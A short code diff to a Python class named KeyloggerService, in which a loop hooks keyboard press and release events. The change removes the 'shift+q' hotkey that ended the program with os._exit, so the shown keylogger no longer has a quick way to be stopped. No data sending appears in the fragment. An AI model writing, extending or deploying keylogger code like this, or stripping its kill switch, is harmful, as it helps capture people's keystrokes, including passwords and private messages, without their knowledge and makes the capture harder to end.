@@ -25,9 +25,6 @@ class KeyloggerService:
     def _start(self) -> None:
         self.__change_action()
         while self.__action:
-            if keyboard.is_pressed('shift+q'):
-
-                os._exit(0)
             keyboard.on_press(self.__on_press)
             keyboard.on_release(self.__add_on_release)
             time.sleep(0.1)
